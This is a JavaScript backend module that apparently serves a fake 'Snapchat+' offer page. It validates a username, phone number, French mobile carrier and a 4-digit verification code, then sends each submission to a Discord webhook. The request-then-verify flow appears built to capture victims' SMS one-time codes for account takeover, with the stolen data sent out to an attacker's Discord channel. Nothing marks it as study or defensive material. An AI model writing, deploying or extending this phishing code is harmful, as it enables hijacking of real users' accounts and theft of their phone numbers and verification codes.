const CARRIERS = new Set(["Bouygues", "Orange", "SFR"]);

function cleanString(value, maxLength) {
  if (typeof value !== "string") return "";
  return value.trim().slice(0, maxLength);
}

function buildEmbed(type, data) {
  if (type === "request") {
    return {
      title: "📱 Nouvelle demande Snapchat+",
      color: 16776960,
      fields: [
        { name: "Pseudo", value: data.username, inline: true },
        { name: "Téléphone", value: data.phone, inline: true },
        { name: "Opérateur", value: data.carrier, inline: true },
      ],
    };
  }

  return {
    title: "🔐 Code de vérification",
    color: 5763719,
    fields: [
      { name: "Pseudo", value: data.username, inline: true },
      { name: "Téléphone", value: data.phone, inline: true },
      { name: "Code", value: data.code, inline: true },
      { name: "Opérateur", value: data.carrier, inline: true },
    ],
  };
}

export function validatePayload(body) {
  if (!body || typeof body !== "object") {
    throw new Error("Invalid payload");
  }

  const type = body.type;
  if (type !== "request" && type !== "verify") {
    throw new Error("Invalid type");
  }

  const username = cleanString(body.username, 64);
  const phone = cleanString(body.phone, 32);
  const carrier = cleanString(body.carrier, 32);

  if (!username || !phone || !CARRIERS.has(carrier)) {
    throw new Error("Invalid fields");
  }

  const payload = { type, username, phone, carrier };

  if (type === "verify") {
    const code = cleanString(body.code, 4);
    if (!/^\d{4}$/.test(code)) {
      throw new Error("Invalid code");
    }
    payload.code = code;
  }

  return payload;
}

export async function processSubmit(body) {
  const payload = validatePayload(body);
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    throw new Error("Webhook not configured");
  }

  const embed = buildEmbed(payload.type, payload);

  const response = await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [
        {
          ...embed,
          timestamp: new Date().toISOString(),
        },
      ],
    }),
  });

  if (!response.ok) {
    throw new Error("Discord request failed");
  }

  return { ok: true };
}
